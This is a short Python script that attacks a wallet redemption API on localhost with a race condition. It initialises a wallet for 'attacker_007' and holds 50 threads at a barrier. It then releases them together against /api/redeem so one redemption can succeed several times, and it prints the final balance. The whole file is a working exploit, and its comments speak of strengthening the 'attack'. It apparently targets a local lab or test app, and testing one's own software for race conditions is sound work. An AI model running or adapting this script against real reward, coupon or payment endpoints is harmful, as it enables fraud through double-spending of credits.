import requests
import concurrent.futures
import time

TARGET = "http://localhost:4000/api/redeem"
INIT = "http://localhost:4000/api/init"
WALLET = "http://localhost:4000/api/wallet/{}"

USER_ID = "attacker_007"
TOTAL_REQUESTS = 50   # increase for stronger attack

session = requests.Session()  # reuse connections


# 🔹 Step 1: Initialize wallet
session.post(INIT, json={"userId": USER_ID})
print(f"[+] Wallet initialized for {USER_ID}")

# 🔹 Barrier for synchronized attack
start_flag = False


def wait_for_start():
    global start_flag
    while not start_flag:
        time.sleep(0.001)


def send_request(i):
    wait_for_start()
    try:
        res = session.post(TARGET, json={"userId": USER_ID}, timeout=5)
        return (i, res.status_code, res.json())
    except Exception as e:
        return (i, "ERROR", str(e))


# 🔹 Step 2: Prepare threads
with concurrent.futures.ThreadPoolExecutor(max_workers=TOTAL_REQUESTS) as executor:
    futures = [executor.submit(send_request, i) for i in range(TOTAL_REQUESTS)]

    time.sleep(1)  # ensure all threads are ready

    print(f"[⚔️] Launching {TOTAL_REQUESTS} concurrent requests...\n")
    start_time = time.time()
    start_flag = True  # 🔥 RELEASE ALL THREADS AT ONCE

    results = [f.result() for f in futures]

end_time = time.time()

# 🔹 Step 3: Print results
success = 0
fail = 0

for r in results:
    i, status, data = r
    print(f"[{i}] Status: {status} → {data}")
    if status == 200:
        success += 1
    else:
        fail += 1

# 🔹 Step 4: Final wallet state
wallet = session.get(WALLET.format(USER_ID)).json()

print("\n========== SUMMARY ==========")
print(f"Total Requests: {TOTAL_REQUESTS}")
print(f"Success: {success}")
print(f"Failed: {fail}")
print(f"Final Wallet Balance: {wallet}")
print(f"Time Taken: {round(end_time - start_time, 3)}s")